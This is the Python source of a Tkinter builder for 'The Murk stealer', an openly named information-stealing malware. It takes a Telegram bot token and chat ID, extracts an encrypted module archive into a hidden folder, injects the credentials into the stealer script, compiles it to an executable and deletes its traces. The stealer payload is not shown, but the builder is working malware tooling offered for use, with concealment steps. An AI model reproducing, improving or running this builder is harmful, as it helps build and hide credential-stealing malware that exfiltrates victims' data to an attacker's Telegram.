#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#



from shutil import move,rmtree
import tkinter
from PIL import ImageTk, Image
from os import path,chdir,system
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes
from tkinter import font
from pyzipper import AESZipFile,ZIP_DEFLATED,WZ_AES
from time import sleep
logo = 'files\logo.png'
textLogo = 'files\itext.png'
icon = 'files\icon.ico'
butonNormalColor ='#404040'
butonSelectedColor ='#303030'
token = ''
id = ''


def WinProperties(win):
    win.geometry("600x400+540+240")
    win.title("The Murk builder")
    win.config(bg="#242424")
    win.resizable(False, False)
    win.iconbitmap(False, icon)


def E(e):    e.widget["bg"] = butonSelectedColor
def L(e):    e.widget["bg"] = butonNormalColor

def build():
    global token
    global id
    global yes
    if yes.get() == 0:
        fullPath = ''
        fullPath = path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        chdir(f'{fullPath}/files')
        system('start update.bat')
        sleep(30)
        yes.set(1)
        chdir(f'{fullPath}')
        win1 = tkinter.Toplevel(win)
        win1.geometry("500x150+680+380")
        win1.title("Info")
        win1.resizable(False, False)
        win1.config(bg="#242424")
        win1.iconbitmap(icon)
        text3 = tkinter.Label(win1, text='All python libraries installed now you can build', bg='#242424', fg='#B4B6B9', font=font3, bd='0')
        text3.place(relx=0.5, rely=0.3, anchor=tkinter.CENTER)
        button1 = tkinter.Button(win1, text='Ok', bg=butonNormalColor, fg='#B4B6B9', font=font1, padx=30, pady=3,
                                 bd='0', activebackground=butonNormalColor, activeforeground='#474849',
                                 state=tkinter.NORMAL, command=win1.destroy)
        button1.bind("<Enter>", E)
        button1.bind("<Leave>", L)
        button1.place(relx=0.5, rely=0.6, anchor=tkinter.CENTER)

    elif yes.get() == 1:
        fullPath = ''
        token = input.get()
        id = input1.get()
        with AESZipFile('Modules.zip', 'r', compression=ZIP_DEFLATED,
                                 encryption=WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pass'))

        SetFileAttributes('buildingCache/', FILE_ATTRIBUTE_HIDDEN)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
            old_data = f.read()

        new_data = old_data.replace('userTOKEN = \'\'', f'userTOKEN = \'{token}\'')
        new_data1 = new_data.replace('userCHAT_ID = \'\'', f'userCHAT_ID = \'{id}\'')

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as f:
            f.write(new_data1)

        fullPath = path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        system('start Compile.bat')
        while path.exists("dist/TheMurk.exe") == 0:
            print('error')
        if path.exists("dist/TheMurk.exe") == 1:
            chdir(f'{fullPath}')
            move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
        rmtree(r'buildingCache', ignore_errors=True)
        win1 = tkinter.Toplevel(win)
        win1.geometry("320x150+680+380")
        win1.title("Info")
        win1.resizable(False, False)
        win1.config(bg="#242424")
        win1.iconbitmap(icon)
        text3 = tkinter.Label(win1, text='Build completed', bg='#242424', fg='#B4B6B9', font=font1, bd='0')
        text3.place(relx=0.5, rely=0.3, anchor=tkinter.CENTER)
        button1 = tkinter.Button(win1, text='Ok', bg=butonNormalColor, fg='#B4B6B9', font=font1, padx=30, pady=3,
                                 bd='0', activebackground=butonNormalColor, activeforeground='#474849',
                                 state=tkinter.NORMAL, command=win1.destroy)
        button1.bind("<Enter>", E)
        button1.bind("<Leave>", L)
        button1.place(relx=0.5, rely=0.6, anchor=tkinter.CENTER)






win = tkinter.Tk()
WinProperties(win)
yes = tkinter.IntVar(value=0)

font1 = font.Font(family= "Terminal", size=16, weight="normal", slant="roman")
font2 = font.Font(family= "Terminal", size=12, weight="normal", slant="roman")
font3 = font.Font(family= "Terminal", size=10, weight="normal", slant="roman")

canvas = tkinter.Canvas(master=win,width=600, height=200, background='#242424', highlightthickness=0)
image = Image.open(f'{logo}')
image = image.resize((200, 200))
image = ImageTk.PhotoImage(image)
imagesprite = canvas.create_image(100, 100, image=image)
imageT = Image.open(f'{textLogo}')
imageT = imageT.resize((400, 64))
imageT = ImageTk.PhotoImage(imageT)
imagesprite1 = canvas.create_image(400, 100, image=imageT)
canvas.place(relx=0.5, rely=0.25, anchor=tkinter.CENTER)

text = tkinter.Label(win, text='Telegram bot token',bg = '#242424',fg = '#B4B6B9',font=font1,bd='0')
input = tkinter.Entry(win,fg = '#B4B6B9',font=font2,width=32,bg='#343638',relief=tkinter.FLAT)
text1 = tkinter.Label(win, text='Your Telegram ID',bg = '#242424',fg = '#B4B6B9',font=font1,bd='0')
input1 = tkinter.Entry(win,fg = '#B4B6B9',font=font2,width=32,bg='#343638',relief=tkinter.FLAT)
cheack = tkinter.Checkbutton(win,text = 'I have all python libraries installed',font=font1,bg = butonNormalColor,fg = '#B4B6B9',indicatoron=0,bd = '0',activebackground=butonSelectedColor,activeforeground='#474849',selectcolor = '#242424',onvalue = 1,offvalue=0,variable=yes)
button=tkinter.Button(win,text='Build',bg = butonNormalColor,fg = '#B4B6B9',font=font1,padx=30,pady=3,bd='0',activebackground=butonNormalColor,activeforeground='#474849',state=tkinter.NORMAL,command=build)
text.place(relx=0.16, rely=0.55, anchor=tkinter.CENTER)
input.place(relx=0.65, rely=0.55, anchor=tkinter.CENTER)
text1.place(relx=0.175, rely=0.65, anchor=tkinter.CENTER)
input1.place(relx=0.65, rely=0.65, anchor=tkinter.CENTER)
cheack.place(relx=0.5, rely=0.75, anchor=tkinter.CENTER)
button.place(relx=0.5, rely=0.90, anchor=tkinter.CENTER)
button.bind("<Enter>", E)
button.bind("<Leave>", L)
win.mainloop()